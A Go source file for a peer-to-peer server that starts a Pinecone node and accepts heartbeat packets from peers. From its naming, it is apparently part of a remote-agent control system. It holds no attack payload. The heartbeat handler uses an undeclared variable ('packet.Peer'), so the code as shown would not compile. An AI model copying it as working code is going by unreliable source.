package main

import (
	"context"
	"crypto/ed25519"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/proto"
	"dev.l1qu1d.net/wraith-labs/wraith_module_comosum/internal/radio"
	"github.com/gorilla/mux"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	//
	// Create a struct to hold config values.
	//

	c := lib.Config{}
	c.Setup()

	//
	// Validate the config.
	//

	if c.PineconeId == "" {
		fmt.Println("no pineconeId was specified; cannot continue")
		os.Exit(1)
	}
	if c.PineconeInboundTcpAddr == "" && c.PineconeInboundWebAddr == "" && !c.PineconeUseMulticast && c.PineconeStaticPeers == "" {
		fmt.Println("no way for peers to connect was specified; cannot continue")
		os.Exit(1)
	}
	pineconeIdBytes, err := hex.DecodeString(c.PineconeId)
	if err != nil {
		fmt.Println("provided pineconeId was not a hex-encoded string; cannot continue")
		os.Exit(1)
	}
	pineconeId := ed25519.PrivateKey(pineconeIdBytes)

	//
	// Configure pinecone manager.
	//

	// Get a struct for managing pinecone connections.
	pr := radio.GetInstance()

	pr.PineconeIdentity = pineconeId
	if c.LogPinecone {
		pr.Logger = log.Default()
	}
	pr.InboundAddr = c.PineconeInboundTcpAddr
	pr.WebserverAddr = c.PineconeInboundWebAddr
	pr.WebserverDebugPath = c.PineconeDebugEndpoint
	pr.UseMulticast = c.PineconeUseMulticast
	if c.PineconeStaticPeers != "" {
		pr.StaticPeers = strings.Split(c.PineconeStaticPeers, ",")
	}

	//
	// Configure signal handler for clean exit.
	//

	sigchan := make(chan os.Signal, 2)
	signal.Notify(sigchan, syscall.SIGTERM, syscall.SIGINT)

	//
	// Main body.
	//

	// Create a state storage struct.
	s := lib.MkState()

	// Create a context to cancel ongoing operations when needed.
	ctx, ctxcancel := context.WithCancel(context.Background())

	// Start pinecone.
	pSocket := pr.Start()

	// Set up pinecone HTTP server.
	wg := sync.WaitGroup{}

	pMux := mux.NewRouter().SkipClean(true).UseEncodedPath()
	pMux.Path(proto.ROUTE_PREFIX + proto.ROUTE_REG).HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		peerPublicKey, err := hex.DecodeString(r.RemoteAddr)
		if err != nil {
			// This shouldn't happen, but if the peer public key is
			// malformed then we have no choice but to ignore the
			// packet.
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		body, err := io.ReadAll(r.Body)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		packetData := proto.PacketHeartbeat{}
		err = proto.Unmarshal(&packetData, peerPublicKey, body)
		if err != nil {
			// The packet data is malformed, there is nothing more we
			// can do.
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		go s.Heartbeat(packet.Peer, packetData)
	})

	pineconeHttpServer := http.Server{
		Addr:         ":0",
		TLSNextProto: map[string]func(*http.Server, *tls.Conn, http.Handler){},
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
		BaseContext: func(_ net.Listener) context.Context {
			return ctx
		},
		Handler: pMux,
	}

	// Start pinecone HTTP server in goroutine.
	wg.Add(1)
	go func() {
		defer wg.Done()

		pineconeHttpServer.Serve(pSocket)
	}()

mainloop:
	for {
		select {
		// Exit if requested.
		case <-sigchan:
			break mainloop
		// Clean up state.
		case <-time.After(lib.STATE_CLEANUP_INTERVAL):
			s.Prune()
		}
	}

	//
	// On exit.
	//

	fmt.Println("exit requested; exiting gracefully")

	go func() {
		<-sigchan
		fmt.Println("exit re-requested; forcing")
		os.Exit(1)
	}()

	// Stop any ongoing operations using this context.
	ctxcancel()

	// Tear down pinecone HTTP server.
	phttpShutdownTimeoutCtx, phttpShutdownTimeoutCtxCancel := context.WithTimeout(context.Background(), time.Second*2)
	pineconeHttpServer.Shutdown(phttpShutdownTimeoutCtx)
	phttpShutdownTimeoutCtxCancel()

	// Stop pinecone.
	pr.Stop()

	// Wait for goroutines to quit.
	wg.Wait()

	os.Exit(0)
}
